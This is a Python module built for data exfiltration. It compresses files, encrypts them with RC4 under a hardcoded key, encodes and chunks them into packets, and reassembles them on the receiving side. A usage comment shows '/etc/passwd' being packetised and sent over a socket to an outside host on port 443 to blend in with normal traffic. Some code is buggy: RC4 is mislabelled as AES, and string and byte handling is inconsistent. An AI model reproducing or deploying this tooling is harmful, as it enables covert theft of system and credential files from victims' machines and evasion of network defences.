#!/usr/bin/python

import os
import sys
import zlib
import time
import random
import struct
import base64
import hashlib

if sys.version_info[0] < 3:
    PY_VER = 2
else:
    PY_VER = 3

DEFAULT_KEY                 = "ShutTheFuckUpDonnie!"
DEFAULT_MAX_PACKET_SIZE     = 65000

BINARY_DELIMITER            = "\x00\x00\xFF\xFF"
ASCII_DELIMITER             = "<AAA\>"


def rc4(data, key):
    """RC4 encryption and decryption method."""
    S, j, out = list(range(256)), 0, []

    for i in range(256):
        j = (j + S[i] + ord(key[i % len(key)])) % 256
        S[i], S[j] = S[j], S[i]

    i = j = 0
    for ch in data:
        i = (i + 1) % 256
        j = (j + S[i]) % 256
        S[i], S[j] = S[j], S[i]
        out.append(chr(ord(ch) ^ S[(S[i] + S[j]) % 256]))

    if PY_VER is 2:
        return "".join(out)
    else:
        return bytes("".join(out), 'utf-8')


def _splitString(stri, length):
    """
    Split string by a particular length.
    :param stri: String to split
    :param length: Length to split by, int
    :return: List
    """
    def _f(s, n):
        while s:
            yield s[:n]
            s = s[n:]
    if type(length) is not int:
        sys.stderr.write("'length' parameter must be an int.\n")
        return False
    if type(stri) is not str and type(stri) is not bytes:
        sys.stderr.write("'stri' parameter must be an string.\n")
        return False
    return list(_f(stri, length))


def DecodePacket(packet_data, enc_key=DEFAULT_KEY, b64_flag=False):
    """
    Takes a raw packet and tries to decode it.
    :param packet_data: raw data of the packet to be decoded.
    :param enc_key: key to use for encryption/decryption.
    :param b64_flag: set this to True for base64 constraint.
    :returns: False or Dictionary object.
    """
    ret = {}

    # Check if we use encryption or not
    if enc_key == "":
        encryption = False
    else:
        encryption = True

    if b64_flag:
        data = base64.b64decode(packet_data)
    else:
        data = packet_data

    if encryption:
        if ASCII_DELIMITER in data or BINARY_DELIMITER in data:
            # This is the first packet. Build logic here.
            if ASCII_DELIMITER in data:
                splitData = data.split(ASCII_DELIMITER)
            else:
                splitData = data.split(BINARY_DELIMITER)
            ret['initFlag'] = True
            ret['fileData'] = {}
            ret['fileData']['FileName'] = splitData[0]
            ret['fileData']['TotalPackets'] = splitData[2]
            ret['fileData']['SequenceID'] = splitData[3]
            ret['fileData']['MD5'] = splitData[4]
            ret['packetNumber'] = splitData[1]
            return ret
            
        try:
            data = rc4(data, enc_key)
        except ValueError as e:
            sys.stderr.write("Data does not decrypt using the key you've provided.\n")
            sys.stderr.write("%s\n" % e)
            return False

    if b64_flag:
        splitData = data.split(ASCII_DELIMITER)
    else:
        splitData = data.split(BINARY_DELIMITER)

    if len(splitData) == 5:
        # Init packet
        ret['initFlag'] = True
        ret['fileData'] = {}
        ret['fileData']['FileName'] = splitData[0]
        ret['fileData']['TotalPackets'] = splitData[2]
        ret['fileData']['SequenceID'] = splitData[3]
        ret['fileData']['MD5'] = splitData[4]
        ret['packetNumber'] = splitData[1]
        return ret

    elif len(splitData) == 3:
        # Data packet
        ret['initFlag'] = False
        ret['packetNumber'] = splitData[1]
        ret['SequenceID'] = splitData[0]
        ret['Data'] = splitData[2]
        return ret

    else:
        sys.stderr.write("Packet split into %s amount of chunks which i don't know.\n" % len(splitData))
        return False


def PrepFile(file_path, kind='binary', max_size=DEFAULT_MAX_PACKET_SIZE, enc_key=DEFAULT_KEY):
    '''
    PrepFile creats a file ready for sending and return an object.
    :param file_path: string, filepath of exfiltration file.
    :param kind: string, binary or ascii as for character limitations.
    :param max_size: integer, default=6500, max amount of data per packet.
    :param enc_key: string, key for AES encryption. if key is empty string,
                    no encryption will be done. Reduces size of packets.
                    Default key is 'ShutTheFuckUpDonnie!'
    :returns: dictionary with data and 'Packets' as list of packets for
                exfiltration sorted by order.
    '''
    ret = {}
    if kind not in ['binary', 'ascii']:
        sys.stderr.write("Parameter 'kind' must by binary/ascii.\n")
        return False

    # Set delimiter based on kind of data we can send
    if kind == 'ascii':
        delm = ASCII_DELIMITER
    else:
        delm = BINARY_DELIMITER

    # Read the file
    try:
        f = open(file_path, 'rb')
        data = f.read()
        f.close()
    except IOError as e:
        sys.stderr.write("Error opening file '%s'.\n" % file_path )
        return False

    # Compute hashes and other meta data
    hash_raw = hashlib.md5(data).hexdigest()
    if enc_key != "":
        ret['Key'] = enc_key
        ret['EncryptionFlag'] = True
    else:
        ret['EncryptionFlag'] = False
    compData = zlib.compress(data)
    hash_compressed = hashlib.md5(compData).hexdigest()
    ret['FilePath'] = file_path
    ret['ChunksSize'] = max_size
    if "/" in file_path:
        ll = file_path.split("/")
        ret['FileName'] = ll[-1]
    elif "\\" in file_path:
        ll = file_path.split("\\")
        ret['FileName'] = ll[-1]
    else:
        ret['FileName'] = file_path
    ret['RawHash'] = hash_raw
    ret['CompressedHash'] = hash_compressed
    if kind == 'ascii':
        data_for_packets = base64.b64encode(compData)
    else:
        data_for_packets = compData

    ret['CompressedSize'] = len(data_for_packets)
    ret['RawSize'] = len(data)

    packetsData = _splitString(data_for_packets, max_size)
    ret['PacketsCount'] = len(packetsData) + 1
    ret['FileSequenceID'] = random.randint(1024,4096)
    ret['Packets'] = []

    # Start building packets
    # Init Packet
    ha = hashlib.md5(data_for_packets).hexdigest()
    fname = ret['FileName']
    pcount = str(len(packetsData) + 1)
    thisCounter = "1"
    seqID = str(ret['FileSequenceID'])

    initPacket = fname + delm + thisCounter + delm
    initPacket += pcount + delm + seqID + delm + hash_raw
    if enc_key == "":
        pass
    else:
        initPacket = rc4(initPacket, enc_key)
    if kind == 'ascii':
        initPacket = rc4(initPacket, enc_key)
        initPacket = base64.b64encode(initPacket)

    ret['Packets'].append(initPacket)

    # Every Packet
    i = 2
    for chunk in packetsData:
        thisPacket = "%s%s%s%s%s" % (seqID, delm, str(i), delm, chunk)
        if enc_key != "":
            thisPacket = rc4(thisPacket, enc_key)
        if kind == 'ascii':
            ret['Packets'].append(base64.b64encode(thisPacket))
        else:
            ret['Packets'].append(thisPacket)
        thisPacket = ""
        i += 1

    return ret


def PrepString(data, max_size=DEFAULT_MAX_PACKET_SIZE, enc_key=DEFAULT_KEY, compress=True):
    '''
    PrepFile creats a file ready for sending and return an object.
    :param data: string, data to be exfiltrated.
    :param max_size: integer, default=6500, max amount of data per packet.
    :param enc_key: string, key for AES encryption. if key is empty string,
                    no encryption will be done. Reduces size of packets.
                    Default key is 'ShutTheFuckUpDonnie!'
    :returns: dictionary with data and 'Packets' as list of packets for
                exfiltration sorted by order.
    '''
    ret = {}
    
    # Compute hashes and other meta data
    hash_raw = hashlib.md5(data).hexdigest()
    if enc_key != "":
        ret['Key'] = enc_key
        ret['EncryptionFlag'] = True
    else:
        ret['EncryptionFlag'] = False
        
    if PY_VER is 3:
        if type(enc_key) is bytes:
            enc_key = enc_key.decode("utf-8")
        if type(data) is bytes:
            data = data.decode("utf-8")
        
    if enc_key is None:
        compData = bytes(data, 'utf-8')
    else:
        compData = rc4(data, enc_key)
    
    if compress:
        compData = zlib.compress(compData)
        compData = base64.b85encode(compData)
    hash_compressed = hashlib.md5(compData).hexdigest()
    ret['FilePath'] = None
    ret['ChunksSize'] = max_size
    ret['FileName'] = None
    ret['RawHash'] = hash_raw
    ret['CompressedHash'] = hash_compressed
    ret['CompressedSize'] = len(compData)
    ret['RawSize'] = len(data)

    packetsData = _splitString(compData, max_size)
    ret['PacketsCount'] = len(packetsData) + 1
    ret['FileSequenceID'] = random.randint(1024,4096)
    ret['Packets'] = packetsData

    return ret


def RebuildFile(packets_data):
    """
    RebuildFiles will get list of dictionaries from 'DecodePacket' returns and will
    try to unify them into one file with all the data.
    :param packets_data: List of 'DecodePacket' outputs.
    :returns: Dictionary will file and file metadata
    """
    if type(packets_data) != list:
        sys.stderr.write("'packets_data' parameter must be list of 'DecodePackets'.\n")
        return False

    initPacket = None
    for pkt in packets_data:
        if type(pkt) is not dict:
            sys.stderr.write("All elements in list needs to be dict.\n")
            return False
        if pkt['initFlag'] is True:
            initPacket = pkt
    if initPacket is None:
        sys.stderr.write("No init packet was found.\n")
        return False

    md5 = initPacket['fileData']['MD5']
    seq = int(initPacket['fileData']['SequenceID'])
    pkts_count = int(initPacket['fileData']['TotalPackets'])
    fname = initPacket['fileData']['FileName']
    ret = {}
    ret['FileName'] = fname
    ret['Packets'] = pkts_count
    ret['MD5'] = md5
    ret['Sequence'] = seq
    ret['Success'] = False

    ddddata = ""
    for i in range(1, pkts_count+1):
        if i == 1:
            continue
        foundFlag = False
        for pkt in packets_data:
            try:
                if int(pkt['SequenceID']) == seq and int(pkt['packetNumber']) == i:
                    ddddata += pkt['Data']
                    foundFlag = True
            except:
                pass
        if foundFlag is False:
            sys.stderr.write("Packet %s is missing.\n" % i)
            return False

    decoded = zlib.decompress(ddddata)
    try:
        decoded = zlib.decompress(ddddata)
        ret['Data'] = decoded
        ret['DataLength'] = len(decoded)
        summ = hashlib.md5(decoded).hexdigest()
        if summ == md5:
            ret['Success'] = True
            ret['Info'] = "Decoded and hashes matched!"
        else:
            ret['Success'] = True
            ret['Info'] = "Decoded but hashes do not match."
        return ret
    except:
        ret['Data'] = ddddata
        ret['DataLength'] = len(ddddata)
        ret['Success'] = False
        ret['Info'] = "Unable to decode data"
        return ret


"""

How to Use:
###########

PrepFile will prepare a file for delivery including packets and structure
with metadata, compression and encryption.

proc = PrepFile('/etc/passwd', kind='binary')


You can then use these packets and send them. For example:

sock = socket.socket()
sock.connect(('google.com', 443))
for i in proc['Packets']:
    sock.send(i)
sock.close()

Decoding a single packet will be:

conjoint = []
for packet in proc['Packets']:
    b = DecodePacket(packet)
    conjoint.append(b)


Joining the decoded packets into one file
print RebuildFile(conjoint)

"""


if __name__ == "__main__":
    sys.stderr.write("Not a stand alone module.\n")
    sys.exit(1)
